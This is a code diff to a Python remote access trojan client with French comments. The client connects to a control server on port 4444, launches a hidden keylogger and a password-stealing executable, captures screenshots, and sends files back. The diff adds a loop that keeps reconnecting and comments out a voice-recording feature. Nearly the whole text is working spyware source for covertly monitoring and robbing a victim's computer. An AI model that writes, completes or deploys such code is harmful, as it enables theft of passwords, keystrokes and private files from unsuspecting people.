@@ -15,7 +15,7 @@ if IS_WINDOWS:
     import winreg
 
 
-SERVER_IP = "192.168.211.1"
+SERVER_IP = "192.168.196.1"
 SERVER_PORT = 4444
 
 
@@ -81,6 +81,35 @@ def send_file(client_socket, file_path, file_type):
         print(f"[+] Fichier '{file_path}' envoyé au serveur.")
     except Exception as e:
         print(f"[Erreur] lors de l'envoi : {e}")
+
+# def send_file(client_socket, file_path, file_type):
+#     try:
+#         if not os.path.exists(file_path):
+#             print(f"[-] Fichier non trouvé : {file_path}")
+#             return
+
+#         with open(file_path, "rb") as file:
+#             file_data = file.read()
+
+#         payload = json.dumps({
+#             "type": file_type,
+#             "filename": os.path.basename(file_path),
+#             "data": file_data.hex()
+#         }).encode("utf-8")
+
+#         if file_type == "voice":
+#             # Envoi avec en-tête structuré
+#             client_socket.sendall(b"VOICE")  # 5 bytes de header clair
+#             client_socket.sendall(struct.pack("!I", len(payload)))
+#             client_socket.sendall(payload)
+#         else:
+#             client_socket.sendall(b"JSON_")  # 5 bytes aussi
+#             client_socket.sendall(payload)
+
+#         print(f"[+] Fichier '{file_path}' envoyé au serveur.")
+#     except Exception as e:
+#         print(f"[Erreur] lors de l'envoi : {e}")
+
 
 def wait_for_file(file_path, timeout=10):
     """Attente que le fichier soit généré (jusqu'à 10 secondes)."""
@@ -156,9 +185,22 @@ def handle_commands(client_socket):
                         send_file(client_socket, latest, "screenshot")
                         os.remove(latest)
 
-            elif command == "voice":
-                # subprocess.Popen([VOICE_EXE], creationflags=subprocess.CREATE_NO_WINDOW)
-                safe_run(VOICE_EXE)        
+            # elif command == "voice":
+            #     safe_run(VOICE_EXE)  
+                # capture_folder = os.path.join(BASE_DIR, "voice")
+                # os.makedirs(capture_folder, exist_ok=True)
+
+                # # Lancer voice_module pour qu’il enregistre un .wav
+                # subprocess.run([VOICE_EXE, capture_folder], check=True)
+
+                # # Trouver le dernier fichier audio
+                # audios = [os.path.join(capture_folder, f) for f in os.listdir(capture_folder) if f.endswith(".wav")]
+                # if audios:
+                #     latest_audio = max(audios, key=os.path.getctime)
+                #     if wait_for_file(latest_audio):
+                #         send_file(client_socket, latest_audio, "voice")
+                #         os.remove(latest_audio)
+    
 
     except Exception as e:
         print(f"[Erreur] de connexion : {e}")
@@ -173,19 +215,38 @@ def main():
 
     # add_to_startup(os.path.join(BASE_DIR, "rat_client.exe")) ======> A CORRIGER 
 
-    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-        s.connect((SERVER_IP, SERVER_PORT))
-        s.send(platform.system().encode())
+    # with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+    #     s.connect((SERVER_IP, SERVER_PORT))
+    #     s.send(platform.system().encode())
 
         
-        if IS_WINDOWS:
-            subprocess.Popen([KEYLOGGER_EXE], creationflags=subprocess.CREATE_NO_WINDOW)
-            subprocess.run([PASSWORD_EXE], check=True)
-        else:
-            subprocess.Popen([KEYLOGGER_EXE])
+    #     if IS_WINDOWS:
+    #         subprocess.Popen([KEYLOGGER_EXE], creationflags=subprocess.CREATE_NO_WINDOW)
+    #         subprocess.run([PASSWORD_EXE], check=True)
+    #     else:
+    #         subprocess.Popen([KEYLOGGER_EXE])
         
 
-        handle_commands(s)
+    #     handle_commands(s)
+
+     while True:
+        try:
+            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+                s.connect((SERVER_IP, SERVER_PORT))
+                s.send(platform.system().encode())
+
+                # Lancer modules au démarrage
+                if IS_WINDOWS:
+                    subprocess.Popen([KEYLOGGER_EXE], creationflags=subprocess.CREATE_NO_WINDOW)
+                    subprocess.run([PASSWORD_EXE], check=True)
+
+                else:
+                    subprocess.Popen([KEYLOGGER_EXE])
+
+                handle_commands(s)
+
+        except:
+            time.sleep(5)
 
 if __name__ == "__main__":
     main()
